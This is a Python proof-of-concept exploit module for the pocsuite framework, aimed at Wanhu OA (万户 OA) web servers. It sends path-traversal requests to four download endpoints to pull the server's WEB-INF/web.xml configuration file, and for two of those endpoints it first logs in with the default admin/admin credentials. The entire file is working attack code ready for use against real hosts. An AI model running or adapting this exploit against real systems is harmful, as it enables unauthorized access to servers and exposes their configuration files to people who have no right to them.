#!/usr/bin/env python
# coding: utf-8
from pocsuite.lib.core.enums import CUSTOM_LOGGING
from pocsuite.lib.core.log import LOGGER
from pocsuite.lib.core.poc import POCBase, Output
from pocsuite.lib.core.register import registerPoc
from pocsuite.thirdparty import requests

_print = lambda msg: LOGGER.log(CUSTOM_LOGGING.SYSINFO, msg)


class FileDownloadPOC(POCBase):
    vulID = 'WooYun-2014-65752'  # ssvid
    version = '???'
    author = ['jsj']
    vulDate = '2018-05-22'
    createDate = '2018-05-22'
    updateDate = '2018-05-22'
    references = ['???']
    name = 'file download'
    appPowerLink = '???'
    appName = '万户 OA'
    appVersion = '???'
    vulType = '任意文件遍历/下载'
    desc = '''
        万户OA多处无限制任意文件下载
    '''

    def base(self):
        info = {"urls": []}
        login_url = self.url + "/defaultroot/Logon!logon.action"
        point1 = self.url + "/defaultroot/netdisk/download_netdisk.jsp?path=1&fileName=../../WEB-INF/web&fileExtName=xml&fileSaveName=x"
        point2 = self.url + "/defaultroot/information_manager/informationmanager_download.jsp?path=..&FileName=WEB-INF/web.xml&name=x"
        point3 = self.url + "/defaultroot/download_netdisk.jsp?path=1&fileName=../../WEB-INF/web&fileExtName=xml&fileSaveName=x"
        point4 = self.url + "/defaultroot/wage_manager/download_wage_excelMode.jsp?fileRealName=x&fileSaveName=../../WEB-INF/web.xml"

        index_page = requests.get(self.url)
        _print("{} <-- {}".format(index_page.status_code, index_page.url))
        if index_page.status_code != 200:
            return "Can not connect the tartget!"

        page_1 = requests.get(point1, cookies=index_page.cookies, headers=index_page.headers)
        _print("{} <-- {}".format(page_1.status_code, page_1.url))
        if page_1.status_code == 200:
            info["urls"].append(page_1.url)

        page_2 = requests.get(point2, cookies=index_page.cookies, headers=index_page.headers)
        _print("{} <-- {}".format(page_2.status_code, page_2.url))
        if page_2.status_code == 200:
            info["urls"].append(page_2.url)

        login_page = requests.post(login_url,
                                   data={"domainAccount": "whir", "userAccount": "admin",
                                         "userPassword": "admin", "localeCode": "zh_CN",
                                         "isRemember": 1, "keyDigest": ""},
                                   cookies=index_page.cookies,
                                   headers=index_page.headers, )
        _print("{} <-- {}".format(login_page.status_code, login_page.url))
        if login_page.status_code == 200:

            page_3 = requests.get(point3, cookies=login_page.cookies, headers=login_page.headers)
            _print("{} <-- {}".format(page_3.status_code, page_3.url))
            if page_3.status_code == 200:
                info["urls"].append(page_3.url)

            page_4 = requests.get(point4, cookies=login_page.cookies, headers=login_page.headers)
            _print("{} <-- {}".format(page_4.status_code, page_4.url))
            if page_4.status_code == 200:
                info["urls"].append(page_4.url)

        elif not info["urls"]:
            return "Get 'org.apache.struts.action.LOCALE' failed!"
        if info["urls"]:
            return info
        else:
            return "There is not VUL on the target."

    def _attack(self):
        _print("attack ...")
        result = Output(self)
        info = self.base()
        if isinstance(info, dict):
            result.success({"AttackInfo": info})
        else:
            LOGGER.log(CUSTOM_LOGGING.WARNING, info)
            result.fail(info)
        return result

    def _verify(self):
        _print("verify ...")
        result = Output(self)
        info = self.base()
        if isinstance(info, dict):
            result.success({"VerifyInfo": info})
        else:
            LOGGER.log(CUSTOM_LOGGING.WARNING, info)
            result.fail(info)
        return result


register = registerPoc(FileDownloadPOC)
